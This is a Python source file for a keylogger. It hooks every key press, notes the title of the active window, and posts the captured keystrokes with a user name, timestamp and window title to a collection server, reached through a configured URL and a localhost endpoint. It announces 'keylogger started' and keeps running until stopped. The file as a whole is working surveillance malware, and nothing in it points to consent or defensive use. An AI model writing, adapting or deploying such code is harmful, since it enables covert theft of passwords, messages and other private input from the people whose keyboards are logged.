import keyboard
import requests
import datetime
import config
import pygetwindow as gw

def returnActiveWindow():
    try:
        active_window = gw.getActiveWindow().title
    except:
        active_window = ""
    return active_window

def update_keylog(keylog):
    app = returnActiveWindow()
    if app != window[0]:
        print("window changed!")
        window[0] = app

        data = {
                "name":config.name,
                "stream":keylog,
                "time":str(datetime.datetime.now()),
                "window":app
        }
        # print(data)
        response = requests.post("http://localhost:5000/updateLog",json=data)
        if response.status_code == 200:
            keylog.clear()
        
def on_key_event(event):
    keylog.append(event.name)
    update_keylog(keylog)

data = {
    "name":config.name,
}



response = requests.post(config.url+"/makedir",json=data)
global window
window = [returnActiveWindow()]

if response.status_code == 200:
    print("keylogger started")
    keylog = []
    keyboard.on_press(on_key_event)
    keyboard.wait()
